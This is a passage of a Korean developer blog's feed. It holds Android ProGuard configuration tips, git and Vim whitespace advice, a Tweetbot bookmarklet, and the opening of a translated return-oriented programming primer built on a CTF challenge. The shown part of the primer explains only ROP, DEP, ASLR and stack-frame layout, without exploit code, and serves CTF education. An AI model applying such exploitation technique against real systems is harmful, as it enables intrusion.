</span><span class='line'><span class="o">-</span><span class="n">keep</span> <span class="kd">interface</span> <span class="nc">android</span><span class="o">.</span><span class="na">support</span><span class="o">.</span><span class="na">v4</span><span class="o">.</span><span class="na">app</span><span class="o">.**</span> <span class="o">{</span> <span class="o">*;</span> <span class="o">}</span>
</span><span class='line'><span class="o">-</span><span class="n">keep</span> <span class="kd">class</span> <span class="nc">com</span><span class="o">.</span><span class="na">actionbarsherlock</span><span class="o">.**</span> <span class="o">{</span> <span class="o">*;</span> <span class="o">}</span>
</span><span class='line'><span class="o">-</span><span class="n">keep</span> <span class="kd">interface</span> <span class="nc">com</span><span class="o">.</span><span class="na">actionbarsherlock</span><span class="o">.**</span> <span class="o">{</span> <span class="o">*;</span> <span class="o">}</span>
</span><span class='line'>
</span><span class='line'><span class="o">-</span><span class="n">keepattributes</span> <span class="o">*</span><span class="n">Annotation</span><span class="o">*</span>
</span></code></pre></td></tr></table></div></figure>


<h3><a id="crashlytics"></a>Crashlytics</h3>

<p><a href="https://www.crashlytics.com">Crashlytics</a>는 이미 ProGuard를 사용한 라이브러리들을 다시 ProGuard가 검사할 필요 없게 해서 <a href="http://www.crashlytics.com/blog/mastering-proguard-for-building-lightweight-android-code/">빌드 시간을 줄이는 팁</a>을 제공하고 있다:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='groovy'><span class='line'><span class="o">-</span><span class="n">libraryjars</span> <span class="n">libs</span>
</span><span class='line'><span class="o">-</span><span class="n">keep</span> <span class="kd">class</span> <span class="nc">com</span><span class="o">.</span><span class="na">crashlytics</span><span class="o">.**</span> <span class="o">{</span> <span class="o">*;</span> <span class="o">}</span>
</span></code></pre></td></tr></table></div></figure>


<p><a href="http://developer.android.com/tools/support-library/">Android Support Library</a>는 이미 소스가 공개되어 있기 때문에 코드 난독화가 필요하지 않다:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='groovy'><span class='line'><span class="o">-</span><span class="n">libraryjars</span> <span class="n">libs</span>
</span><span class='line'><span class="o">-</span><span class="n">keep</span> <span class="kd">class</span> <span class="nc">android</span><span class="o">.</span><span class="na">support</span><span class="o">.</span><span class="na">v4</span><span class="o">.</span><span class="na">app</span><span class="o">.**</span> <span class="o">{</span> <span class="o">*;</span> <span class="o">}</span>
</span><span class='line'><span class="o">-</span><span class="n">keep</span> <span class="kd">interface</span> <span class="nc">android</span><span class="o">.</span><span class="na">support</span><span class="o">.</span><span class="na">v4</span><span class="o">.</span><span class="na">app</span><span class="o">.**</span> <span class="o">{</span> <span class="o">*;</span> <span class="o">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>ProGuard를 이용해 코드 난독화 작업을 거치게 되면, 소스 파일의 줄 번호가 바뀌게 되어 Crashlytics의 스택 트레이스에서 정보를 얻기 어려울 수 있다. <a href="http://support.crashlytics.com/knowledgebase/articles/202926-android-studio-and-intellij-with-proguard">소스 파일의 줄 번호 정보를 유지</a>하려면 다음 문장을 추가한다:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='groovy'><span class='line'><span class="o">-</span><span class="n">keepattributes</span> <span class="n">SourceFile</span><span class="o">,</span><span class="n">LineNumberTable</span>
</span></code></pre></td></tr></table></div></figure>


<p>다만 이 코드 때문에 난독화가 덜 되는 것 같다는 생각이 든다면, 파일 이름을 모두 <code>"SourceFile"</code> 문자열로 <a href="http://proguard.sourceforge.net/manual/examples.html#stacktrace">바꿀 수도 있다</a>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='groovy'><span class='line'><span class="o">-</span><span class="n">renamesourcefileattribute</span> <span class="n">SourceFile</span>
</span><span class='line'><span class="o">-</span><span class="n">keepattributes</span> <span class="n">SourceFile</span><span class="o">,</span><span class="n">LineNumberTable</span>
</span></code></pre></td></tr></table></div></figure>


<h3><a id="google-play-services-sdk"></a>Google Play Services SDK</h3>

<p><a href="https://developer.android.com/google/play-services/index.html">Google Play Services SDK</a> 또한 필요한 클래스가 사라지는 것을 방지하기 위한 <a href="https://developer.android.com/google/play-services/setup.html#Proguard">ProGuard 규칙</a>을 제공하고 있다:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='groovy'><span class='line'><span class="o">-</span><span class="n">keep</span> <span class="kd">class</span> <span class="err">* </span><span class="nc">extends</span> <span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">ListResourceBundle</span> <span class="o">{</span>
</span><span class='line'>    <span class="kd">protected</span> <span class="n">Object</span><span class="o">[][]</span> <span class="nf">getContents</span><span class="o">();</span>
</span><span class='line'><span class="o">}</span>
</span><span class='line'>
</span><span class='line'><span class="o">-</span><span class="n">keep</span> <span class="kd">public</span> <span class="kd">class</span> <span class="nc">com</span><span class="o">.</span><span class="na">google</span><span class="o">.</span><span class="na">android</span><span class="o">.</span><span class="na">gms</span><span class="o">.</span><span class="na">common</span><span class="o">.</span><span class="na">internal</span><span class="o">.</span><span class="na">safeparcel</span><span class="o">.</span><span class="na">SafeParcelable</span> <span class="o">{</span>
</span><span class='line'>    <span class="kd">public</span> <span class="kd">static</span> <span class="kd">final</span> <span class="o">***</span> <span class="n">NULL</span><span class="o">;</span>
</span><span class='line'><span class="o">}</span>
</span><span class='line'>
</span><span class='line'><span class="o">-</span><span class="n">keepnames</span> <span class="nd">@com.google.android.gms.common.annotation.KeepName</span> <span class="kd">class</span> <span class="err">*</span>
</span><span class='line'><span class="o">-</span><span class="n">keepclassmembernames</span> <span class="kd">class</span> <span class="err">* {</span>
</span><span class='line'>    <span class="nd">@com.google.android.gms.common.annotation.KeepName</span> <span class="o">*;</span>
</span><span class='line'><span class="o">}</span>
</span><span class='line'>
</span><span class='line'><span class="o">-</span><span class="n">keepnames</span> <span class="kd">class</span> <span class="err">* </span><span class="nc">implements</span> <span class="n">android</span><span class="o">.</span><span class="na">os</span><span class="o">.</span><span class="na">Parcelable</span> <span class="o">{</span>
</span><span class='line'>    <span class="kd">public</span> <span class="kd">static</span> <span class="kd">final</span> <span class="o">**</span> <span class="n">CREATOR</span><span class="o">;</span>
</span><span class='line'><span class="o">}</span>
</span></code></pre></td></tr></table></div></figure>


<h2><a id="see-also"></a>참고 목록</h2>

<ul>
<li><a href="http://tools.android.com/tech-docs/new-build-system/user-guide">Gradle Plugin User Guide</a> by <a href="http://tools.android.com">Android Tools Project Site</a></li>
<li><a href="http://www.crashlytics.com/blog/mastering-proguard-for-building-lightweight-android-code/">Mastering ProGuard for Building Lightweight Android Code</a> by <a href="https://www.crashlytics.com">Crashlytics</a></li>
<li><a href="http://proguard.sourceforge.net/manual/index.html">ProGuard Manual</a> by <a href="http://proguard.sourceforge.net">ProGuard</a></li>
<li><a href="http://novafactory.net/archives/2845">Gradle - Progaurd 사용하기(proguard rule)</a> by <a href="https://plus.google.com/113131691466488717287">Nova</a></li>
</ul>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Layout Inflation as Intended &rarr;]]></title>
    <link href="http://yous.be/2014/05/12/layout-inflation-as-intended/"/>
    <updated>2014-05-12T07:17:37+09:00</updated>
    <id>http://yous.be/2014/05/12/layout-inflation-as-intended</id>
    <content type="html"><![CDATA[<p>안드로이드 개발을 하다 보면 <a href="http://developer.android.com/reference/android/view/LayoutInflater.html">LayoutInflater</a>의 <a href="http://developer.android.com/reference/android/view/LayoutInflater.html#inflate(int,%20android.view.ViewGroup)">inflate(int, ViewGroup)</a>와 <a href="http://developer.android.com/reference/android/view/LayoutInflater.html#inflate(int,%20android.view.ViewGroup,%20boolean)">inflate(int, ViewGroup, boolean)</a>는 꽤 익숙하다. 하지만 다음 두 줄의 코드가 어떻게 다른지 아는 사람은 그리 많지 않을 것 같다. 실제로 <a href="http://tools.android.com/tips/lint">Android Lint</a>는 한쪽 코드는 피하도록 권하고 있다.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="n">inflater</span><span class="o">.</span><span class="na">inflate</span><span class="o">(</span><span class="n">R</span><span class="o">.</span><span class="na">layout</span><span class="o">.</span><span class="na">my_layout</span><span class="o">,</span> <span class="kc">null</span><span class="o">);</span>
</span><span class='line'><span class="n">inflater</span><span class="o">.</span><span class="na">inflate</span><span class="o">(</span><span class="n">R</span><span class="o">.</span><span class="na">layout</span><span class="o">.</span><span class="na">my_layout</span><span class="o">,</span> <span class="n">parent</span><span class="o">,</span> <span class="kc">false</span><span class="o">);</span>
</span></code></pre></td></tr></table></div></figure>


<p><a href="http://www.doubleencore.com/author/daves/">Dave Smith</a>가 이 두 코드의 비교와 함께, <a href="http://www.doubleencore.com/2013/05/layout-inflation-as-intended/">바른 Layout Inflation 방법</a>에 대해 설명한 글이 있어 소개한다.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Fragment Transaction &amp; Activity State Loss &rarr;]]></title>
    <link href="http://yous.be/2014/04/03/fragment-transaction-and-activity-state-loss/"/>
    <updated>2014-04-03T00:03:50+09:00</updated>
    <id>http://yous.be/2014/04/03/fragment-transaction-and-activity-state-loss</id>
    <content type="html"><![CDATA[<p><a href="http://developer.android.com/reference/android/support/v4/app/FragmentTransaction.html">FragmentTransaction</a>을 <a href="http://developer.android.com/reference/android/support/v4/app/FragmentTransaction.html#commit()">commit()</a> 했을 때 Activity의 <a href="http://developer.android.com/reference/android/app/Activity.html#onSaveInstanceState(android.os.Bundle)">onSaveInstanceState(Bundle)</a>이 실행된 후라면 다음과 같은 에러 메시지를 보게 된다:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>java.lang.IllegalStateException: Can not perform this action after onSaveInstanceState</span></code></pre></td></tr></table></div></figure>


<p>이 문제의 원인이 무엇인지, 어떻게 이 Exception을 피할지, 그리고 <a href="http://developer.android.com/reference/android/support/v4/app/FragmentTransaction.html#commitAllowingStateLoss()">commitAllowingStateLoss()</a>가 왜 마지막 수단이 되어야 하는지 잘 설명한 글이 있어 소개한다. <a href="http://www.androiddesignpatterns.com/about/">Alex Lockwood</a>가 쓴 <a href="http://www.androiddesignpatterns.com/2013/08/fragment-transaction-commit-state-loss.html">Fragment Transaction과 Activity State Loss</a>에 관한 글이다.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Trailing whitespace is evil. Don't commit evil into your repo. &rarr;]]></title>
    <link href="http://yous.be/2014/03/31/trailing-whitespace-is-evil-dont-commit-evil-into-your-repo/"/>
    <updated>2014-03-31T20:57:09+09:00</updated>
    <id>http://yous.be/2014/03/31/trailing-whitespace-is-evil-dont-commit-evil-into-your-repo</id>
    <content type="html"><![CDATA[<p><a href="http://codeimpossible.com/about.html">Jared Barboza</a>가 쓴 <a href="http://codeimpossible.com/2012/04/02/Trailing-whitespace-is-evil-Don-t-commit-evil-into-your-repo-/">줄 끝 공백에 관한 글</a>이다.</p>

<blockquote><p><strong>난 최근에 다양한 사람/언어/편집기와 함께 많은 프로젝트를 진행해 왔다. 우리들 대부분은 Git 초보자였고, 각 프로젝트는 줄 끝 공백에 관한 문제가 있었다.</strong></p></blockquote>

<p>경력 있는 개발자로만 이루어진 팀이라고 해도 이런 문제는 발생하기 마련이다.</p>

<blockquote><p>줄 끝 공백은 당신의 저장소에서 상당히 많은 문제를 일으킬 수 있다. 실제로 바뀐 것은 공백일 뿐인데도 그 줄에 변경 사항이 있다는 잘못된 diff를 만든다.</p>

<p>이는 개발 과정에서 나중에 실제 파일의 변경 사항이 무엇이었는지 찾기 불가능하게 만든다. 대부분의 오픈 소스 프로젝트 대표들은 이를 알고 있고, 그들 대부분은 줄 끝 공백을 없애지 않은 풀 리퀘스트를 거절할 것이다.</p></blockquote>

<p>이후 글에서는 Visual Studio와 Sublime Text 2에서 줄 끝 공백을 제거하는 방법과 git hook을 통해 커밋에 줄 끝 공백이 포함되지 않도록 하는 방법을 소개하고 있다.</p>

<p>나는 Android Studio에서는 파일 저장 시 모든 줄 끝 공백을 지우고, Vim에서는 줄 끝 공백에 하이라이트를 입혀 쓰고 있다.</p>

<figure class='code'><figcaption><span>.vimrc</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='vim'><span class='line'><span class="nb">highlight</span> ExtraWhitespace ctermbg<span class="p">=</span><span class="k">red</span> guibg<span class="p">=</span><span class="k">red</span>
</span><span class='line'><span class="k">autocmd</span> <span class="nb">BufWinEnter</span> * <span class="k">match</span> ExtraWhitespace <span class="sr">/\s\+$/</span>
</span><span class='line'><span class="k">autocmd</span> <span class="nb">InsertEnter</span> * <span class="k">match</span> ExtraWhitespace <span class="sr">//</span>
</span><span class='line'><span class="k">autocmd</span> <span class="nb">InsertLeave</span> * <span class="k">match</span> ExtraWhitespace <span class="sr">/\s\+$/</span>
</span><span class='line'><span class="k">if</span> <span class="k">version</span> <span class="p">&gt;=</span> <span class="m">702</span>
</span><span class='line'>  <span class="k">autocmd</span> <span class="nb">BufWinLeave</span> * <span class="k">call</span> clearmatches<span class="p">()</span>
</span><span class='line'><span class="k">end</span>
</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Twitter Link Bookmarklet &rarr;]]></title>
    <link href="http://yous.be/2014/03/27/twitter-link-bookmarklet/"/>
    <updated>2014-03-27T10:18:57+09:00</updated>
    <id>http://yous.be/2014/03/27/twitter-link-bookmarklet</id>
    <content type="html"><![CDATA[<p><a href="http://davebradford.com/about/">Dave Bradford</a>의 트위터에 관한 팁 <a href="http://davebradford.com/blog/twitter-profile-bookmarklet/">Twitter Profile Bookmarklet</a>을 봤다. 직접 써 보니 기능이 추가됐으면 더 좋을 것 같아 추가했다.</p>

<p>일단, 원글에 있는 코드의 기능은 간단하다. 모바일 사파리를 통해 트위터 계정을 보다가 북마크 버튼을 한 번 누르면 <a href="http://tapbots.com/software/tweetbot/">Tweetbot</a>에서 볼 수 있게 된다. 여기에 브라우저를 통해 &lsquo;트윗&#8217;을 보고 있다면 Tweetbot으로 바로 그 트윗을 볼 수 있게 기능을 추가했다. OS X에서도 동일하게 작동한다.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="kd">var</span> <span class="nx">url</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">URL</span><span class="p">;</span>
</span><span class='line'><span class="kd">var</span> <span class="nx">match</span> <span class="o">=</span> <span class="nx">url</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="sr">/status(?:es)?\/(\d+)/i</span><span class="p">);</span>
</span><span class='line'><span class="kd">var</span> <span class="nx">tweetbotUrl</span><span class="p">;</span>
</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="nx">match</span> <span class="o">==</span> <span class="kc">null</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="nx">tweetbotUrl</span> <span class="o">=</span> <span class="nx">url</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/https?:\/\/(mobile\.)?twitter\.com\//</span><span class="p">,</span> <span class="s2">&quot;tweetbot:///user_profile/&quot;</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="k">else</span> <span class="p">{</span>
</span><span class='line'>    <span class="nx">tweetbotUrl</span> <span class="o">=</span> <span class="s2">&quot;tweetbot:///status/&quot;</span> <span class="o">+</span> <span class="nx">match</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="nb">window</span><span class="p">.</span><span class="nx">location</span> <span class="o">=</span> <span class="nx">tweetbotUrl</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


<p>원리는 간단하다. 현재 페이지 URL에 <code>status</code>나 <code>statuses</code>가 포함되어 있으면 트윗을 열고, 그렇지 않으면 계정을 보여 준다. 아래 코드를 북마크 해두고, 필요할 때 눌러주면 된다.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>javascript:var%20url=document.URL;var%20match=url.match(/status(?:es)?%5C/(%5Cd+)/i);var%20tweetbotUrl;if(match==null)%7BtweetbotUrl=url.replace(/https?:%5C/%5C/(mobile%5C.)?twitter%5C.com%5C//i,%22tweetbot:///user_profile/%22)%7Delse%7BtweetbotUrl=%22tweetbot:///status/%22+match[1]%7Dwindow.location=tweetbotUrl;</span></code></pre></td></tr></table></div></figure>


<p>기기에 Tweetbot 2와 Tweetbot 3가 모두 깔려 있을 때 Tweetbot 2로 열리는 점은 아쉽다.</p>

<p>via <a href="http://yoonjiman.net/2014/03/25/twitter-profile-bookmarklet/">Yoon Jiman</a></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Global Git Ignore &rarr;]]></title>
    <link href="http://yous.be/2014/03/25/global-git-ignore/"/>
    <updated>2014-03-25T20:49:32+09:00</updated>
    <id>http://yous.be/2014/03/25/global-git-ignore</id>
    <content type="html"><![CDATA[<p><a href="http://usevim.com">usevim</a>의 <a href="http://twitter.com/#!/alex_young">Alex Young</a>이 쓴 <a href="http://usevim.com/2013/10/04/gitglobal-ignore/">global gitignore에 관한 글</a>이다.</p>

<blockquote><p>나는 몇 년간 <code>.gitignore</code>에 <code>*.sw?</code>을 넣어 왔는데, Vim을 쓰지 않는 사람들은 특정 편집기를 위한 <code>.gitignore</code> 항목을 보고 싶지 않아 할 수도 있다는 걸 깨달았다. 편집기들은 임시 파일과 복구 파일을 각자 다른 방식으로 관리하기 때문에 이 설정을 모두에게 강요하는 것은 과해 보인다.</p>

<p>이것보단 global 옵션을 사용하는 것이 낫다. <code>git config --global core.excludesfile ~/.gitignore</code>를 실행해라. 그러면 거기에 <code>*.sw?</code>을, 어쩌면 <code>*~</code>도 넣을 수 있다. 난 <code>.DS_Store</code>를 추가할 텐데, Windows 개발자들은 여기 신경 쓸 필요가 없기 때문이다. 그리고 그들은 아마 <code>Thumbs.db</code>를 추가해야 할 것이다.</p></blockquote>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[ropasaurusrex: return-oriented programming 입문서 &rarr;]]></title>
    <link href="http://yous.be/2014/03/19/ropasaurusrex-a-primer-on-return-oriented-programming/"/>
    <updated>2014-03-19T20:44:03+09:00</updated>
    <id>http://yous.be/2014/03/19/ropasaurusrex-a-primer-on-return-oriented-programming</id>
    <content type="html"><![CDATA[<p><a href="https://blog.skullsecurity.org">SkullSecurity</a>의 <a href="https://blog.skullsecurity.org/author/ron">Ron Bowes</a>가 쓴 <a href="https://blog.skullsecurity.org/2013/ropasaurusrex-a-primer-on-return-oriented-programming">return-oriented programming 입문서</a>가 있어 번역했다.</p>

<!-- more -->


<hr />

<p>CTF 대회 중 가장 기분이 나쁠 때는 <a href="http://knowyourmeme.com/memes/captain-hindsight">나중에 깨닫는</a> 문제를 풀 때다. 한 문제에 몇 시간을 보내고 나서&mdash;내가 <a href="https://blog.skullsecurity.org/blog/2013/epic-cnot-writeup-plaidctf">cnot</a>에 쓴 시간에 비할 바는 아니지만&mdash;사실은 꽤 쉬운 문제라는 걸 깨닫는다. 하지만 역시 골치아프다. 그게 바로 ROP다!</p>

<p>어쨌든, 잘못된 방법으로 많은 시간을 썼음에도 불구하고 (특히, 한동안 <a href="https://en.wikipedia.org/wiki/Address_space_layout_randomization">ASLR</a>을 우회할 생각은 하지 않았다), 우리가 이 문제를 풀기까지 거쳤던 과정(ASLR을 고려하지 않고, 그 다음은 ASLR을 고려해서)은 설명하기 좋은 방법이므로 이 글에서도 같은 방법을 사용하겠다.</p>

<p>먼저, 이 글에서 파트너가 되어 준 HikingPete에게 감사하고 싶다. 그 덕분에 우리는 이 퍼즐을 훨씬 빨리 풀 수 있었고, 잠깐 동안 세계 3위를 차지했다!</p>

<p>우연히, 난 한동안 <a href="https://en.wikipedia.org/wiki/Return-oriented_programming">ROP</a>에 대한 글을 쓸 셈이었다. 심지어 기초가 될 취약한(vulnerable) 데모 프로그램까지 만들고 있었다! 하지만 PlaidCTF에서 문제가 나왔으니 그 데모 대신 이 문제에 대해 말하겠다! 이건 단순한 문제 풀이(writeup)가 아니고, 상당히 상세한 return-oriented programming 입문서가 될 것이다! 만약 CTF 문제를 푸는 과정이 더 궁금하다면, <a href="https://blog.skullsecurity.org/blog/2013/epic-cnot-writeup-plaidctf">내 cnot writeup</a>을 보라. :)</p>

<h2><a id="what-the-heck-is-rop"></a>도대체 ROP가 뭐야?</h2>

<p>ROP&mdash;return-oriented programming&mdash;는 고전적 익스플로잇(exploit) &ldquo;<a href="https://en.wikipedia.org/wiki/Return-to-libc_attack">return into libc</a>&#8220;를 나타내는 현대 용어다. 이 아이디어는 프로그램을 마음대로 조종할 수 있는 오버플로(overflow)나 다른 유형의 취약점을 발견했지만, 코드를 실행 가능한 메모리 영역(executable memory)에 올릴 수 있는 확실한 방법이 없을 때(<a href="https://en.wikipedia.org/wiki/Data_Execution_Prevention">DEP</a>, 데이터 실행 방지(Data Execution Prevention), 사용자가 원하는 곳에서부터 코드를 실행시킬 수 없다)를 위한 것이다.</p>

<p>ROP를 이용하면 실행 가능한 메모리 영역(executable memory)에 이미 있는 코드 중 &lsquo;<a href="https://en.wikipedia.org/wiki/Return_statement">return</a>&#8216;으로 끝나는 조각들을 고를 수 있다. 그 조각들이 간단할 때도 있고, 복잡할 때도 있다. 다행히도 이 예제에서 우리는 간단한 것들만 필요하다!</p>

<p>하지만 우린 너무 앞서나가고 있다. 일단 <a href="https://en.wikipedia.org/wiki/Call_stack">스택(stack)</a>에 대해 좀 더 배워보자! 스택을 설명하는 데에 <em>엄청난</em> 시간을 쓰지는 않을 것이니, 잘 모르겠다면 <a href="https://blog.skullsecurity.org/wiki/index.php/The_Stack">내 어셈블리(assembly) 튜토리얼</a><sup id="fnref:1"><a href="#fn:1" rel="footnote">1</a></sup>을 보라.</p>

<h2><a id="the-stack"></a>스택</h2>

<p>스택에 관해 한 번쯤은 들어보았을 것이다. <a href="https://en.wikipedia.org/wiki/Stack_overflow">스택 오버플로(stack overflow)</a>? 스택 깨뜨리기(smashing the stack)? 하지만 그게 무슨 뜻인가? 이미 알고 있다면, 이걸 간단한 입문서 정도로 생각하거나 바로 다음 섹션으로 넘어가라. 당신 마음대로!</p>

<p>이 간단한 아이디어를 설명하자면, 함수 <code>A()</code>가 함수 <code>B()</code>를 두 개의 인자 1, 2와 함께 호출한다고 하자. 그리고 <code>B()</code>는 <code>C()</code>를 두 개의 인자 3, 4와 함께 호출한다고 하자. <code>C()</code>가 실행 중일 때, 스택은 이렇게 보일 것이다:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>+----------------------+
</span><span class='line'>|         ...          | (높은 주소)
</span><span class='line'>+----------------------+
</span><span class='line'>
</span><span class='line'>+----------------------+ &lt;-- 'A'의 스택 프레임 시작
</span><span class='line'>|   [return address]   | &lt;-- 'A'를 호출한 주소
</span><span class='line'>+----------------------+
</span><span class='line'>|   [frame pointer]    |
</span><span class='line'>+----------------------+
</span><span class='line'>|   [local variables]  |
</span><span class='line'>+----------------------+
</span><span class='line'>
</span><span class='line'>+----------------------+ &lt;-- 'B'의 스택 프레임 시작
</span><span class='line'>|         2 (parameter)|
</span><span class='line'>+----------------------+
</span><span class='line'>|         1 (parameter)|
</span><span class='line'>+----------------------+
</span><span class='line'>|   [return address]   | &lt;-- 'B'가 반환되는 주소
</span><span class='line'>+----------------------+
</span><span class='line'>|   [frame pointer]    |
</span><span class='line'>+----------------------+
</span><span class='line'>|   [local variables]  |
</span><span class='line'>+----------------------+
</span><span class='line'>
</span><span class='line'>+----------------------+ &lt;-- 'C'의 스택 프레임 시작
</span><span class='line'>|         4 (parameter)|
</span><span class='line'>+----------------------+
</span><span class='line'>|         3 (parameter)|
</span><span class='line'>+----------------------+
</span><span class='line'>|   [return address]   | &lt;-- 'C'가 반환되는 주소
</span><span class='line'>+----------------------+
</span><span class='line'>
</span><span class='line'>+----------------------+
</span><span class='line'>|         ...          | (낮은 주소)
</span><span class='line'>+----------------------+</span></code></pre></td></tr></table></div></figure>


<p>당신이 이 수준에서 숨쉬듯이 생각하는 사람이 아니라면 이건 꽤 어려운 (눈을 끄는?) 것이기 때문에 조금 설명하도록 하겠다. 매번 당신이 함수를 호출할 때, 새로운 &ldquo;스택 프레임&#8221;이 만들어진다. &#8220;프레임&#8221;은 단순히 말해 함수가 자신을 위해 스택에 할당한 메모리다. 사실은 할당조차 하지 않으며, 그저 끝에 뭔가 추가하고 <code>esp</code> 레지스터를 업데이트 한다. 그러면 이것이 호출하는 모든 함수는 자신의 스택 프레임이 어디에서 시작해야 하는지 알게 된다(<code>esp</code>, 스택 포인터이며 이는 기본적으로 변수다).</p>

<p>이 스택 프레임은 현재 함수의 상태(context)를 담고 있고, 당신이 쉽게 a) 새로 불린 함수의 프레임을 만들고, b) 이전 프레임으로 돌아갈 수 있게 한다 (예를 들어, 함수에서 반환한 경우). <code>esp</code>(스택 포인터)는 위아래로 움직이지만 항상 스택의 시작점(가장 낮은 주소)을 가리킨다.</p>

<p>다른 함수를 호출했을 때 원래 함수의 지역 변수들은 어디로 가는지 궁금한 적이 있는가 (더 좋게는, 같은 함수를 재귀적으로 한 번 더 호출할 때)? 당연히 없을 것이다! 하지만 생각해 봤다면, 이미 알고 있을 것이다: 우리가 다시 돌아올 예전 스택 프레임에 머무른다!</p>

<p>이제 스택에 무엇이 저장되어 있는지 스택에 들어간 순서대로 보자 (헷갈리지만, 스택을 다른 방법으로 그릴 수도 있다; 이 글에서는 스택이 위에서 아래로 늘어나기에 오래된/호출하는 함수는 위에, 새로운/호출된 함수는 아래에 있다):</p>

<ul>
<li>인자(Parameters): 호출한 함수가 넘긴 인자들&mdash;ROP에서 <em>대단히</em> 중요하다.</li>
<li>반환 주소(Return address): 모든 함수는 자신이 끝나면 어디로 가야 하는지 알아야 한다. 당신이 함수를 호출하면, 그 함수에 진입하기 앞서 호출 직후의 명령어(instruction) 주소가 스택에 들어간다. 반환하는 순간, 그 주소를 스택에서 뽑고, 그리로 점프한다. 이건 ROP에서 대단히 중요하다.</li>
<li>프레임 포인터(Saved frame pointer): 이건 완전히 무시하자. 정말로. 이건 예외는 있지만 컴파일러가 일반적으로 하는 일이고, 이에 대해 다시 언급하지는 않을 것이다.</li>
<li>지역 변수(Local variables): 함수는 지역 변수를 저장하기 위해 필요한 만큼 (적당한 범위 내에서) 메모리를 할당할 수 있다. 지역 변수는 여기서 시작한다. ROP와는 전혀 관계 없으며 무시해도 안전하다.</li>
</ul>


